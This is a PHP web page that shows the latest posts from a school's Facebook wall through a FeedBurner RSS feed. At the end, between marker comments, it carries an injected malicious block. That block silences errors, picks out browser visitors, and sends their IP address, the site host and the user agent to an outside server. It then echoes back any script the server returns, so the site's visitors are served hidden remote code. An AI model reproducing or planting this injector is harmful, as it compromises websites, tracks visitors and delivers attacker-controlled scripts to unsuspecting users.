<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
   	</head>
	<body>
    <style>
		ul#facebook 
		{
			padding: 0;
			margin: 0;
			list-style: none;
			font-size: 12px;
			font-family: "lucida grande",tahoma,verdana,arial,sans-serif;
		}
 		ul#facebook img { margin-right: 5px; }
 		ul#facebook li 
		{
			padding: 10px 0 10px 0;
			margin: 0;
			overflow: hidden;
			border-bottom: solid 1px #E9E9E9;
		}
		ul#facebook li p 
		{
			padding: 3px 0 3px 0;
			margin: 0;
			line-height: 18px;
		}
 		ul#facebook a 
		{
 		}
 		ul#facebook li a { color: #3B5998 !important; text-decoration: none; }
 		ul#facebook li a:hover { text-decoration: underline; }
	</style>
<?php
date_default_timezone_set('America/Sao_Paulo');	
ini_set("allow_url_fopen", 1);

//http://www.facebook.com/feeds/notifications.php?id=147258622020256&viewer=100002627877844&key=AWgRMN_AO7eAEyOc&format=rss20
$feed_burner_url = 'http://feeds.feedburner.com/BeitEnglishSchoolsFacebookWall';
$doc = new DOMDocument();
$doc->load($feed_burner_url);
$feeds = array();
$limit = 3;
$counter = 0;

foreach ($doc->getElementsByTagName('item') as $node) {
 
	if	($counter <= $limit)
	{
		$items = array (
			'title' 		=> $node->getElementsByTagName('title')->item(0)->nodeValue,
			'link' 			=> $node->getElementsByTagName('link')->item(0)->nodeValue,
			'description' 	=> $node->getElementsByTagName('description')->item(0)->nodeValue,
			'pubDate' 		=> $node->getElementsByTagName('pubDate')->item(0)->nodeValue
		);
		array_push($feeds, $items);
	}
	$counter++;
}

echo '
<ul id="facebook">';
 
foreach ($feeds as $feed)
{
	$date = strtotime($feed['pubDate']);
 
	echo '<li>';
	echo '<strong><a href="'. $feed['link'] .'">Facebook Page</a></strong> '. utf8_decode($feed['description']) . ' '. date('jS F Y G:H' ,$date) .'';
	echo '</li>';
}
echo '</ul>';
?>
<?php
#b7b0ce#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/b7b0ce#
?>
	</body>
</html>